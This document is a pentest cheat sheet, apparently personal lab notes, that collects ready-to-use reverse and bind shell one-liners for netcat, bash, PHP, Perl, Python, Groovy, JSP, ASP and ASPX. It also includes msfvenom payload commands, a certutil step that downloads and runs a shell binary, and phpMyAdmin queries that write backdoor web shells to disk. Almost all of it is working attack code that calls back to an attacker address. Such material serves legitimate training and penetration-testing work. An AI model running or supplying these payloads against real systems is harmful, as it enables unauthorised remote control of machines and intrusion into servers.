## Netcat

### Reverse/Bind Shell

#### Unix

*Victim:*
```bash
#Linux
nc 192.168.0.1 4444 -e /bin/bash
nc -nlvp 4444 -e /bin/bash


#Windows
nc 192.168.0.1 4444 -e cmd.exe
nc -nlvp 4444 -e cmd.exe

```
*If `-e` is not allowed, try to find other versions of netcat (or download it, refer to [[Post Exploitaton/File Download]])*

```bash
/bin/nc
/usr/bin/ncat
/bin/netcat
/bin/nc.traditional
```


***

## Bash

### Reverse Shell

```bash
/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
```


***

## Revshells.com
https://www.revshells.com

***


## PHP

### Kali Default PHP Shells
```bash
#Reverse
cat /usr/share/webshells/php/php-reverse-shell.php

#CMD
cat /usr/share/webshells/php/simple-backdoor.php

```
***Attenzione al sistema operativo, cambiare il comando nella shell per ***

### CMD Shell
```bash
<?php echo system($_REQUEST["cmd"]); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
```
*Call the CMD shell:*
```bash
http://192.168.0.1/cmd_shell.php?cmd=whoami
```

### PHP Reverse Shell
*Version 1:*
```bash
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1");?>
```

*Version 2:*
```bash
<?php $sock=fsockopen("192.168.0.1", 4444);exec("/bin/sh -i <&3 >&3 2 >& 3");?>
```

*As Command:*
```bash
php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```



### WhiteWinterWolf Webshell

https://github.com/WhiteWinterWolf/wwwolf-php-webshell

***
## JSP

### Execute command
Command inputted in "cmd" URL parameter.
```jsp\
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

MSFVenom Revshell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.85 LPORT=4455 -f raw > revme.jsp

```

## ASPX

### Transfer A File (Certutil)
```bash
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

### Execute a File
```bash
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

***
## ASP

### Execute command
Command inputted in "cmd" URL parameter.
```
<% eval request("cmd") %>
```
***



## MSFVENOM

### Windows Binary (.exe)
#### 32 Bit (x86)
*Reverse Shell:*
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

*Bind Shell:*
```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

*Output in Hex, C Style, Exclude bad chars, Exitfunction thread:*
```bash
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

#### 64 Bit (x64)
*Reverse Shell:*
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

*Bind Shell:*
```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

*Meterpreter:*
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

### Linux Binary (.elf)
#### 32 Bit (x86)
*Reverse Shell:*
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

*Bind Shell:*
```bash
msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf
```

#### 64 Bit (x64)
*Reverse Shell:*
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

*Bind Shell:*
```bash
msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf
```

### Java Server Pages (.jsp)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
```

*As .war:*
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
```

### Active Sever Pages Extended (.aspx)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```

***


## Jenkins / Groovy (Java)

### Linux Reverse Shell
```Java
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Windows Reverse Shell
```Java
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

***

## Perl

### Reverse Shell
```perl
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
***

## Python

### As Command (Reverse Shell)
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python Code (Reverse Shell)
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

***

## PhpmyAdmin

Write a CMD shell into a file with the right permissions. Issue the following select.
(Try different paths for different webservers)

*Windows:*
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

*Unix:*
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

***


